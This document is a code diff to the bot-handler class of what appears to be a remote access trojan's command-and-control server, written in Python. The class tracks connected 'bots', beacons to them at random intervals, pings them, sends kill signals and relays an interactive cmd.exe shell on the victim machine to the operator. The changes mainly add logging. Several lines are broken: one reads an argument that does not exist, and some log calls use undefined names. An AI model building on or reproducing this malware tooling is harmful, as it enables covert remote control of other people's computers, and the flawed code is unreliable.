@@ -13,9 +13,9 @@ class Handler(threading.Thread):
 
     def __init__(self, *args):
         #tcp signature
-        if len(args) == 3:
+        if len(args) == 4:
             threading.Thread.__init__(self)
-            # self.logger = logger
+            self.loggers = args[3]
             self.client = args[0]
             self.client_address = args[1]
             self.ip = client_address[0]
@@ -25,12 +25,13 @@ class Handler(threading.Thread):
             self.beacon_wait = False
             self.os = ''
             self.interactive = False
+
             self.status = ["UP","UP"]                       # <--UP - DOWN - ERR 
                                                             # [0] = PING, [1] = BEACON
         #http signature
         elif len(args) == 1:
             threading.Thread.__init__(self)
-            #self.logger = logger
+            self.loggers = args[3]
             self.ip = '127.0.0.1'
             self.port = 5000
             self.bot_id = args[0]
@@ -38,27 +39,10 @@ class Handler(threading.Thread):
             self.beacon_wait = False
             self.os = ''
             self.interactive = False
+            
             self.status = ["UP","UP"]                       # <--UP - DOWN - ERR 
                                                             # [0] = PING, [1] = BEACON
-
-    '''def __init__(self, client, client_address, bot_id):
-        threading.Thread.__init__(self)
-        # self.logger = logger
-        self.client = client
-        self.client_address = client_address
-        self.ip = client_address[0]
-        self.port = client_address[1]
-        self.bot_id = bot_id
-        self.info = [self.bot_id,self.ip,self.port]
-        self.beacon_wait = False
-        self.os = ''
-        self.interactive = False
-        self.status = ["UP","UP"]                           # <--UP - DOWN - ERR 
-                                                            # [0] = PING, [1] = BEACON
-    '''
         # Log by
-
-
 
     def run(self):
 
@@ -66,10 +50,15 @@ class Handler(threading.Thread):
         # This specific line returns 'None'
         #self.BotName = threading.current_thread().getName()
 
-        print(f"[*BotHandler-Msg] Slave {self.ip}:{str(self.port)} connected with Session ID of {str(self.bot_id)}")
+        print(f"[*BotHandler-Msg] Bot {self.ip}:{str(self.port)} connected with Session ID of {str(self.bot_id)}")
+        loggers[0].q_log('conn','info','[* BotHandler-Msg] Bot '+self.ip+':'+str(self.port)+' connected with Session ID of '+str(self.bot_id))
+        loggers[0].q_log('serv','info','[* BotHandler-Msg] Bot handler object created for: '+self.ip+':'+str(self.port)+'; Session ID of '+str(self.bot_id))
+
 
         # Grab operating system : Linux/Windows
         self.setOS()
+        loggers[0].q_log('serv','info','[* BotHandler-Msg] Bot '+str(self.bot_id)+' operating system set: '+str(self.os))
+
 
         # Beacon indefinitely??
         self.beacon()
@@ -77,15 +66,19 @@ class Handler(threading.Thread):
 
     def kill(self):     # hah
         print(f"\n[*BotHandler-Msg] Severing connection for Bot {str(self.bot_id)}...")
+
+        # Log
+        loggers[0].q_log('serv','info','[* BotHandler-Msg] Killing conneciton for bot '+str(self.bot_id))
+        loggers[0].q_log('conn','info','[* BotHandler-Msg] Killing connection for bot '+str(self.bot_id))
+
         self.execute("kill")
 
-        print(f"\n[*BotHandler-Msg] Killing thread for BotHandler {str(self.bot_id)}...")
-        # if(threading.current_thread().is_alive()):
-        #     threading.current_thread().join
-
-
     def beacon(self):
-        
+        # Log
+        loggers[0].q_log('serv','info','[* BotHandler-Msg] Bot '+str(self.bot_id)+' beacon started')
+        loggers[0].q_log('conn','info','[* BotHandler-Msg] Bot '+str(self.bot_id)+' beacon started')
+        loggers[0].q_log('up','info','[* BotHandler-Msg] Bot '+str(self.bot_id)+' beacon started')
+
         while(True):
             time.sleep(random.randint(10,40))
 
@@ -94,10 +87,13 @@ class Handler(threading.Thread):
                 ping = os.system("ping -c 2 -w2 " + self.ip + " > /dev/null 2>&1")
                 if ping == 0:
                     self.status[0] = "UP"
+
                 else:
                     self.status[0] = "DOWN"
+
             except:
                 self.status[0] = "ERR"
+
 
             # Write to log file - record uptime
 
@@ -159,7 +155,9 @@ class Handler(threading.Thread):
             self.execute("shell", True)             # Signals RAT to initiate cmd.exe process and forward fds to socket
         except Exception as ex:
             print(f"[* BotHandler-Msg:ShellExec] Unable to initiate shell with bot {self.bot_id} at {str(self.ip)}")
+
             print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
+
             return False                            # unsuccessful
         else:
 
@@ -186,14 +184,19 @@ class Handler(threading.Thread):
                 cmd_sent = input()                                            # Dumb capture in
                 cmd_sent += "\n"
             except Exception as ex:
-                print(f"[* BotHandler-Msg:ShellExec] Unable to parse command")  # Error recived? pass
+                print(f"[* BotHandler-Msg:ShellExec] Unable to parse command")
+                loggers[0].q_log('serv','warning','[* BotHandler-Msg:ShellExec] Unable to parse command')
                 print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
+                loggers[0].q_log('serv','warning','[* BotHandler-Msg:ShellExec] Error: ' + str(ex))
+
             else:
                 try:
                     cmd_response = ""
                     shell_exit = False
                     if(cmd_sent.casefold().strip(" ") == 'quit\n' or cmd_sent.casefold().strip(" ") == 'exit\n'):
                         print(f"[* BotHandler-Msg:ShellExec] Sending EXIT signal to Agent. Please wait...")
+                        loggers[0].q_log('serv','warning','[* BotHandler-Msg:ShellExec] Sending EXIT signal to agent: '+str(bot_id))
+
                         self.client.send(("exit\n").encode('utf-8'))
 
                         while(True):
@@ -208,7 +211,10 @@ class Handler(threading.Thread):
                                 recv = ""
                             except Exception as ex:
                                 print("[* BotHandler-Msg:ShellExec] Unable to process received data.")
+                                loggers[0].q_log('serv','warning','[* BotHandler-Msg:ShellExec] Unable to process received data')
+
                                 print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
+
                                 break
 
                             if not recv:
@@ -238,7 +244,9 @@ class Handler(threading.Thread):
                                 recv = ""
                             except Exception as ex:
                                 print("[* BotHandler-Msg:ShellExec] Unable to process received data.")
+
                                 print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
+
                                 break
 
                             if not recv:
@@ -249,7 +257,9 @@ class Handler(threading.Thread):
                     
                 except Exception as ex:
                     print(f"[* BotHandler-Msg:ShellExec] Unable to send command to bot {self.bot_id} at {str(self.ip)}")        #Error Received? pass
+
                     print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
+
                 else:
                     
                     if len(cmd_response.strip()) > 1:
@@ -260,6 +270,7 @@ class Handler(threading.Thread):
                         break
 
         print(f"[* BotHandler-Msg:ShellExec] Exiting interaction with Bot #{self.bot_id} at {str(self.ip)}")
+
         self.beacon_wait = False
         return True
 
